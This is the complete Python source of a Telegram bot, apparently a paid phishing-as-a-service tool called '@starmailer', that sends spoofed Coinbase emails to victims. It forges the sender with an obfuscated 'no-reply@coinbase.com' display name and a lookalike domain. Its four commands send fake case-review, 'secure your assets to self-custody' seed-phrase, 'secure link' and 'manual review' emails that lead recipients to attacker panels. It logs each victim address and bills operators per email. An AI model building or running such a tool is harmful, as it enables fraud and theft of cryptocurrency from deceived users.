import smtplib
import os
import logging
import json
import logging
from datetime import datetime
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ConversationHandler, filters, ContextTypes


from_display_name = "=?UTF-8?B?4oCNQ2/igI3igI3igIzigI3igI1p4oCN4oCN4oCM4oCN4oCNbmJh4oCN4oCN4oCM4oCN4oCNc2UgPG5vLXJlcGx5QGNvaW5iYXNlLmNvbT4==="
from_email = "=?UTF-8?B?[base64domainhere]<=?UTF-8?B?[base64domainhere]@tk8wqcbrcxhekrwy1n80.coinbase.co>"
smtp_details = {
    'server': '', 
    'port': '',
    'username': '', 
    'password': '' 
}



file_logger = logging.getLogger("file_logger")
file_logger.setLevel(logging.INFO)


file_handler = logging.FileHandler("bot_logs.log", mode="a", encoding="utf-8")
file_handler.setLevel(logging.INFO)


formatter = logging.Formatter("%(message)s") 
file_handler.setFormatter(formatter)


file_logger.addHandler(file_handler)

console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_handler.setFormatter(formatter)  
file_logger.addHandler(console_handler)


logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("apscheduler").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)
logging.getLogger("telegram.ext").setLevel(logging.WARNING)



email_count_file = "email_count.json"
whitelist_file = "whitelist.json"
balance_file = "balance.json"
global_email_count = 0
user_email_counts = {}
whitelisted_users = []
user_balances = {}


RECIPIENTS, REPRESENTATIVE, CASE_ID, SEED_PHRASE, LINK, AMOUNT_TOKEN = range(6)


logging.basicConfig(level=logging.INFO)

# Admin ID
ADMIN_ID = 7208067825


def log_email_details(update: Update, command_type: str, victim_email: str, extra_info: dict = None):
    """Logs email details for each command in the required format."""
    user = update.effective_user
    username = user.username if user.username else "Unknown"
    user_id = user.id
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
  
    command_type = f"yahoo_{command_type}"

    if command_type == "yahoo_wallet_coinbase":
        log_message = f"@{username} / {user_id} | {victim_email} | {command_type} | Seed phrase: {extra_info['seed_phrase']} | {current_time}"
    elif command_type == "yahoo_secure_coinbase":
        log_message = f"@{username} / {user_id} | {victim_email} | {command_type} | Link: {extra_info['link']} | {current_time}"
    else:
        log_message = f"@{username} / {user_id} | {victim_email} | {command_type} | {current_time}"


    file_logger.info(log_message)

def load_balances():
    global user_balances
    if os.path.exists(balance_file):
        with open(balance_file, "r") as file:
            user_balances = json.load(file)
    else:
        user_balances = {}

def save_balances():
    with open(balance_file, "w") as file:
        json.dump(user_balances, file)

def deduct_balance(user_id: int, amount: float = 5.0) -> bool:
    user_id_str = str(user_id)
    if user_id_str not in user_balances:
        return False
    if user_balances[user_id_str] < amount:
        return False
    user_balances[user_id_str] -= amount
    save_balances()
    return True

def load_email_counts():
    global global_email_count, user_email_counts
    if os.path.exists(email_count_file):
        with open(email_count_file, "r") as file:
            data = json.load(file)
            global_email_count = data.get("global_count", 0)
            user_email_counts = data.get("user_counts", {})
    else:
        global_email_count = 0
        user_email_counts = {}

def save_email_counts():
    with open(email_count_file, "w") as file:
        json.dump({"global_count": global_email_count, "user_counts": user_email_counts}, file)

def load_whitelist():
    global whitelisted_users
    if os.path.exists(whitelist_file):
        with open(whitelist_file, "r") as file:
            whitelisted_users = json.load(file)
    else:
        whitelisted_users = []

def save_whitelist():
    with open(whitelist_file, "w") as file:
        json.dump(whitelisted_users, file)


load_balances()
load_email_counts()
load_whitelist()


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    user_count = user_email_counts.get(str(user_id), 0)
    balance = user_balances.get(str(user_id), 0)
    start_message = (
        "Welcome to @starmailer\n"
        "Support: @lovecoinbase\n\n"
        "[Info]\n\n"
        f"• Mails sent: {global_email_count}\n"
        f"• Your mails sent: {user_count}\n"
        f"• Your balance: ${balance:.2f}\n\n"
        "[Misc]\n\n"
        "• /id - Get your user id.\n"
        "• /cancel - Cancel sending your mail.\n\n"
        "[Coinbase]\n\n"
        "• /employee_coinbase - Send a case review coinbase email.\n"
        "• /wallet_coinbase - Send a coinbase wallet email.\n"
        "• /secure_coinbase - Send a secure link coinbase email.\n"
        "• /coinbase_delay - Send a delay email for manual review.\n\n"
    )
    await update.message.reply_text(start_message)

async def add_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    

    if user_id != ADMIN_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        return


    if len(context.args) != 2:
        await update.message.reply_text("Usage: /add_balance <user_id> <amount>")
        return

    try:
        target_user_id = str(context.args[0])
        amount = float(context.args[1])


        if target_user_id in user_balances:
            user_balances[target_user_id] += amount
        else:
            user_balances[target_user_id] = amount
        
        save_balances()
        await update.message.reply_text(f"Added ${amount} to user {target_user_id}'s balance.")
    
    except ValueError:
        await update.message.reply_text("Invalid input. Please enter a valid user ID and amount.")


async def whitelist_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        return

    if len(context.args) != 1:
        await update.message.reply_text("Please provide a valid user ID to whitelist.")
        return
    
    try:
        user_to_whitelist = int(context.args[0]) 
        whitelisted_users.append(user_to_whitelist)  
        save_whitelist() 
        await update.message.reply_text(f"User {user_to_whitelist} has been whitelisted.")
    except ValueError:
        await update.message.reply_text("Please provide a valid numeric user ID.")


async def get_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    await update.message.reply_text(f"Your user ID is: {user_id}")

async def wallet_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    if not user_id in whitelisted_users:
        await update.message.reply_text("You are not whitelisted to use this bot.")
        return ConversationHandler.END

    if not deduct_balance(user_id):
        await update.message.reply_text("Insufficient balance. Please top up your balance.")
        return ConversationHandler.END

    await update.message.reply_text("Enter the recipient's email address:")
    return RECIPIENTS

async def get_wallet_recipient_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["recipients"] = update.message.text
    await update.message.reply_text("Enter the seed phrase:")
    return SEED_PHRASE


async def send_wallet_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    recipients = context.user_data["recipients"]
    seed_phrase = update.message.text

    log_email_details(
        update, 
        command_type="wallet_coinbase", 
        victim_email=recipients, 
        extra_info={"seed_phrase": seed_phrase}
    )

   
    with open("coinbase_wallet_template.html", "r", encoding="utf-8") as file:
        html_content = file.read()


    html_content = html_content.replace("seed_placeholder", seed_phrase)


    msg = MIMEMultipart("related")
    from_header = f"{from_display_name} <{from_email}>"
    msg['From'] = from_header
    msg['To'] = recipients
    msg['Subject'] = "ACTION NEEDED: Secure your assets to self-custody"
    msg.attach(MIMEText(html_content, 'html'))


    image_path = "wallet.png"
    if os.path.exists(image_path):
        with open(image_path, 'rb') as img_file:
            img = MIMEImage(img_file.read())
            img.add_header('Content-ID', '<logo>')
            msg.attach(img)


    try:
        with smtplib.SMTP(smtp_details['server'], smtp_details['port']) as server:
            server.starttls()
            server.login(smtp_details['username'], smtp_details['password'])
            server.sendmail(smtp_details['username'], recipients, msg.as_string())
        await update.message.reply_text("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email. Error: {e}")
        await update.message.reply_text(f"Failed to send email. Error: {e}")
    
    return ConversationHandler.END


async def employee_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    if not user_id in whitelisted_users:
        await update.message.reply_text("You are not whitelisted to use this bot.")
        return ConversationHandler.END

    if not deduct_balance(user_id):
        await update.message.reply_text("Insufficient balance. Please top up your balance.")
        return ConversationHandler.END

    await update.message.reply_text("Enter the recipient's email address:")
    return RECIPIENTS


async def get_employee_recipient_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["recipients"] = update.message.text
    await update.message.reply_text("Enter the representative's name:")
    return REPRESENTATIVE


async def get_representative_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["representative"] = update.message.text
    await update.message.reply_text("Enter the case ID:")
    return CASE_ID


async def send_employee_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    recipients = context.user_data["recipients"]
    representative = context.user_data["representative"]
    case_id = update.message.text

    log_email_details(
        update, 
        command_type="employee_coinbase",  
        victim_email=recipients, 
        extra_info={"representative": representative, "case_id": case_id}
    )


    with open("coinbase_template.html", "r", encoding="utf-8") as file:
        html_content = file.read()


    html_content = html_content.replace("Daniel Greene", representative)
    html_content = html_content.replace("1835246", case_id)


    msg = MIMEMultipart("related")
    from_header = f"{from_display_name} <{from_email}>"
    msg['From'] = from_header
    msg['To'] = recipients
    msg['Subject'] = "Coinbase Case Review"
    msg.attach(MIMEText(html_content, 'html'))


    image_path = "coinbase.png"
    if os.path.exists(image_path):
        with open(image_path, 'rb') as img_file:
            img = MIMEImage(img_file.read())
            img.add_header('Content-ID', '<logo>')
            msg.attach(img)

 
    try:
        with smtplib.SMTP(smtp_details['server'], smtp_details['port']) as server:
            server.starttls()
            server.login(smtp_details['username'], smtp_details['password'])
            server.sendmail(smtp_details['username'], recipients, msg.as_string())
        await update.message.reply_text("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email. Error: {e}")
        await update.message.reply_text(f"Failed to send email. Error: {e}")
    
    return ConversationHandler.END


async def secure_coinbase(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    if not user_id in whitelisted_users:
        await update.message.reply_text("You are not whitelisted to use this bot.")
        return ConversationHandler.END

    if not deduct_balance(user_id):
        await update.message.reply_text("Insufficient balance. Please top up your balance.")
        return ConversationHandler.END

    await update.message.reply_text("Enter the recipient's email address:")
    return RECIPIENTS


async def get_secure_recipient_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["recipients"] = update.message.text
    await update.message.reply_text("Enter the representative's name:")
    return REPRESENTATIVE


async def get_secure_representative_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["representative"] = update.message.text
    await update.message.reply_text("Enter the case ID:")
    return CASE_ID


async def get_secure_case_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["case_id"] = update.message.text
    await update.message.reply_text("Enter the panel link:")
    return LINK


async def send_secure_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    recipients = context.user_data["recipients"]
    representative = context.user_data["representative"]
    case_id = context.user_data["case_id"]
    secure_link = update.message.text

    log_email_details(
        update, 
        command_type="secure_coinbase", 
        victim_email=recipients, 
        extra_info={"link": secure_link}
    )


    with open("coinbase_secure_template.html", "r", encoding="utf-8") as file:
        html_content = file.read()


    html_content = html_content.replace("Daniel Greene", representative)
    html_content = html_content.replace("1835246", case_id)
    html_content = html_content.replace("https://link.com", secure_link)


    msg = MIMEMultipart("related")
    from_header = f"{from_display_name} <{from_email}>"
    msg['From'] = from_header
    msg['To'] = recipients
    msg['Subject'] = "Secure Coinbase Link"
    msg.attach(MIMEText(html_content, 'html'))


    image_path = "coinbase.png"
    if os.path.exists(image_path):
        with open(image_path, 'rb') as img_file:
            img = MIMEImage(img_file.read())
            img.add_header('Content-ID', '<logo>')
            msg.attach(img)

    try:
        with smtplib.SMTP(smtp_details['server'], smtp_details['port']) as server:
            server.starttls()
            server.login(smtp_details['username'], smtp_details['password'])
            server.sendmail(smtp_details['username'], recipients, msg.as_string())
        await update.message.reply_text("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email. Error: {e}")
        await update.message.reply_text(f"Failed to send email. Error: {e}")
    
    return ConversationHandler.END

async def coinbase_delay(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    if not user_id in whitelisted_users:
        await update.message.reply_text("You are not whitelisted to use this bot.")
        return ConversationHandler.END

    if not deduct_balance(user_id):
        await update.message.reply_text("Insufficient balance. Please top up your balance.")
        return ConversationHandler.END

    await update.message.reply_text("Enter the recipient's email address:")
    return RECIPIENTS


async def get_delay_recipient_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data["recipients"] = update.message.text
    await update.message.reply_text("Enter the amount and token symbol (e.g., '1000 USDC'):")
    return AMOUNT_TOKEN


async def get_amount_token(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_input = update.message.text.split()
    if len(user_input) == 2:
        context.user_data["amount"] = user_input[0]
        context.user_data["token_symbol"] = user_input[1]
        await update.message.reply_text("Enter the panel link:")
        return LINK
    else:
        await update.message.reply_text("Invalid input. Please enter the amount and token symbol (e.g., '1000 USDC'):")
        return AMOUNT_TOKEN

async def send_delay_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    recipients = context.user_data["recipients"]
    amount = context.user_data["amount"]
    token_symbol = context.user_data["token_symbol"]
    link = update.message.text

    log_email_details(
        update, 
        command_type="coinbase_delay",  
        victim_email=recipients, 
        extra_info={"amount": amount, "token_symbol": token_symbol, "link": link}
    )


    with open("coinbase_transaction.html", "r", encoding="utf-8") as file:
        html_content = file.read()


    html_content = html_content.replace("{{amount}}", amount)
    html_content = html_content.replace("{{token_symbol}}", token_symbol)
    html_content = html_content.replace("{{link}}", link)


    msg = MIMEMultipart("related")
    from_header = f"{from_display_name} <{from_email}>"
    msg['From'] = from_header
    msg['To'] = recipients
    msg['Subject'] = "A manual review is pending"
    msg.attach(MIMEText(html_content, 'html'))


    image_path = "coinbase.png"
    if os.path.exists(image_path):
        with open(image_path, 'rb') as img_file:
            img = MIMEImage(img_file.read())
            img.add_header('Content-ID', '<logo>')
            msg.attach(img)


    try:
        with smtplib.SMTP(smtp_details['server'], smtp_details['port']) as server:
            server.starttls()
            server.login(smtp_details['username'], smtp_details['password'])
            server.sendmail(smtp_details['username'], recipients, msg.as_string())
        await update.message.reply_text("Coinbase delay email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email. Error: {e}")
        await update.message.reply_text(f"Failed to send email. Error: {e}")

    return ConversationHandler.END


async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("Conversation cancelled.")
    return ConversationHandler.END

def main():
    TOKEN = ""  # Replace with your bot token
    application = ApplicationBuilder().token(TOKEN).build()


    wallet_coinbase_handler = ConversationHandler(
        entry_points=[CommandHandler("wallet_coinbase", wallet_coinbase)],
        states={
            RECIPIENTS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_wallet_recipient_email)],
            SEED_PHRASE: [MessageHandler(filters.TEXT & ~filters.COMMAND, send_wallet_email)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )


    employee_coinbase_handler = ConversationHandler(
        entry_points=[CommandHandler("employee_coinbase", employee_coinbase)],
        states={
            RECIPIENTS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_employee_recipient_email)],
            REPRESENTATIVE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_representative_name)],
            CASE_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, send_employee_email)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )


    secure_coinbase_handler = ConversationHandler(
        entry_points=[CommandHandler("secure_coinbase", secure_coinbase)],
        states={
            RECIPIENTS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_secure_recipient_email)],
            REPRESENTATIVE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_secure_representative_name)],
            CASE_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_secure_case_id)],
            LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, send_secure_email)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    coinbase_delay_handler = ConversationHandler(
        entry_points=[CommandHandler("coinbase_delay", coinbase_delay)],
        states={
            RECIPIENTS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_delay_recipient_email)],
            AMOUNT_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_amount_token)],
            LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, send_delay_email)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )


    application.add_handler(wallet_coinbase_handler)
    application.add_handler(employee_coinbase_handler)
    application.add_handler(secure_coinbase_handler)
    application.add_handler(coinbase_delay_handler)
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("whitelist", whitelist_user))
    application.add_handler(CommandHandler("cancel", cancel))
    application.add_handler(CommandHandler("id", get_user_id))
    application.add_handler(CommandHandler("add_balance", add_balance)) 


    application.run_polling()

if __name__ == "__main__":
    main()
